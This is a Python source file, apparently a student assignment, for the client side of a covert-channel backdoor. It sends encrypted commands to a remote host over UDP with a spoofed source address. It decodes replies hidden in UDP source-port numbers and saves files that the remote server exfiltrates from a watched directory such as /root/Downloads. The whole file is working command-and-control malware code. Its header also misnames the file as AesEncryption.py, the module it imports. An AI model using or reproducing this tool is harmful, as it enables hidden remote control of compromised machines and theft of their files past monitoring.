##################################################################################
##  SOURCE FILE:    AesEncryption.py
##
##  AUTHOR:         Geoff Dabu
##
##  PROGRAM:
##
##
##  FUNCTIONS:      stopfilter(packet)
##					main()
##
##  DATE:           October 17, 2015
##
##################################################################################
import sys, os, argparse, socket, logging, threading, sys
from scapy.all import *
from AesEncryption import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
sema1 = threading.BoundedSemaphore(value=1)
message = []
fileMessage = []

##################################################################################
##  FUNCTION
##
##  Name:       	stopfilter
##  Parameters:		packet - a packet that is passed in through sniffed
##  Return Values:	boolean - true, if sniff function ends. false, if sniff
##					function continues.
##  Description:	Determines whether the client continues to sniff for packets.
##					The client only continues if there is a pkt with payload.
##################################################################################
def stopfilter(pkt):
	global message, fileMessage

	if ARP in pkt:
		return False

	if UDP in pkt:

		if pkt['UDP'].dport == 8000:

			if pkt['UDP'].sport != 128:
				message.append(pkt['UDP'].sport)
				return False

			if pkt['UDP'].sport == 128:
				secret = ""
				for m in message:
					secret += chr(m)

				print decrypt(secret)

				secret = ""
				message = []
				sema1.release()
				return True


		elif pkt['UDP'].dport == 7000:
			if pkt['UDP'].sport != 128:
				fileMessage.append(pkt['UDP'].sport)
				return False

			if pkt['UDP'].sport == 128:
				fileString = ""
				for m in fileMessage:
					fileString += chr(m)


				secretFile = open(decrypt(pkt['Raw'].load), 'w')
				secretFile.write(decrypt(fileString))
				secretFile.close()

				fileString = ""
				fileMessage = []

				print("Directory Update\n***New input: ")
				return True

def sendCommandLoop(args):
	while 1:
		sema1.acquire()
		payload = raw_input("***New input: \n")
		pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=int(args.dstPort), sport=8000)/encrypt(payload)
		send(pkt)


##################################################################################
##  FUNCTION
##
##  Name:       	main
##  Parameters:		n/a
##  Return Values:	n/a
##  Description:	Prompts the user for a command, encrypts it and sends it to
##					the server.
##################################################################################
def main():


	cmdParser = argparse.ArgumentParser(description="8505A3-PortKnock Client")
	cmdParser.add_argument('-d','--dstIp',dest='dstIp', help='Destination address of the host to send the message to.', required=True)
	cmdParser.add_argument('-s','--srcIp',dest='srcIp', help='Source address of the host thats sending.', required=True)
	cmdParser.add_argument('-p','--dstPort',dest='dstPort', help='Destination port of the host to send the message to.', required=True)
	args = cmdParser.parse_args();

	pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=22, sport=8000)/("/root/Downloads")
	send(pkt)

	t1 = threading.Thread(name="sendCommandLoop", target=sendCommandLoop, args=[args])
	t1.start()

	while 1:
		sniff(filter="udp and (dst port 8000 or dst port 7000)", stop_filter=stopfilter)

	t1.join()



if __name__ == '__main__':
	main()
